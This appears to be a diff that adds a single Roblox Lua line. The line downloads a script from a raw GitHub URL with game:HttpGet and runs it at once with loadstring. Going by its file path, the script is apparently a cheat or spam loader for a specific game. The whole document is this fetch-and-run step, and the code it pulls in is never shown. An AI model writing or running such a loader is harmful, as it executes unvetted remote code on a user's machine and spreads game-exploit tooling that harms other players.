@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/topprefectmatch/loaders/main/loaders/anomaly-rally-wrong-way-spam0-0ls4kusflp0j4c.lua"))()
